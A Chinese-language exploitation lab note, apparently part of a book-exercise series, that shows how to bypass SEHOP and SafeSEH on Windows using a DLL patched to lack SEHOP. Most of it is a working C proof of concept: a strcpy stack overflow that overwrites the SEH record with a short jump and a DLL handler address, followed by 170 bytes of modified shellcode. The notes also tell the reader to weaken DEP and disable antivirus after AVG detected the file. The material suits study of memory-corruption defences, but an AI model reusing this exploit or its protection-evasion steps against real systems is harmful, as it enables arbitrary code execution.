##   利用未啟用SEHOP的模塊



###   利用第11章的 SEH_NOSafeSEH_JUMP.DLL
###   因為躲過了SEHOP 還要處理 SafeSEH 所以用前面的例子


###   首先修改dll 關鍵部分這樣這個dll 就是不支援SEHOP

 ![enter image description here](https://i.imgur.com/yZ19Uy4.png)



###   注意 shellcode 需要多修改一些地方，因為環境換了 dll 順序不一樣
```
#include <string.h>
#include <windows.h>
#include <stdio.h>
#include <tchar.h>

char shellcode[] = 

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
//216


"\xeb\x0e"
"BB"
// next

"\x17\x5c\x12\x11"
//handler


"CCCCCCCC"
//padding for 8 bytes 


//shellcode

"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09"

"\x8B\x09" // add one more \x8b\x09 here! That is mov ecx, [ecx]

"\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
//170 bytes

;

DWORD MyException(void)
{
	printf("There is an exception\n");
	getchar();
	return 1;
}

void test(char *input)
{
	char str[200];
	strcpy(str, input);
	int zero = 0;
	__try{
		zero = 1 / zero;
	}
	__except(MyException())
	{
	
	}
}

int main(int argc, char argv[])
{
	HINSTANCE hInst = LoadLibrary(_T("test.dll"));
	char str[200];
	//__asm int 3
	test(shellcode);

	return 0;
}
```

###   本例是直接往下跳到 shellcode，跳過中間的bad 指令



###  過程中遇到的問題，首先你要設置

DEP 選 opt in 只保護系統基本， opt out 是除了自己指定的，其他都保護。

![enter image description here](https://i.imgur.com/tV2RO4Q.png)

另外關閉防毒，被AVG 抓到了。


![enter image description here](https://i.imgur.com/GNSE1Fu.png)



###  成功

![enter image description here](https://i.imgur.com/TicGyt6.png)
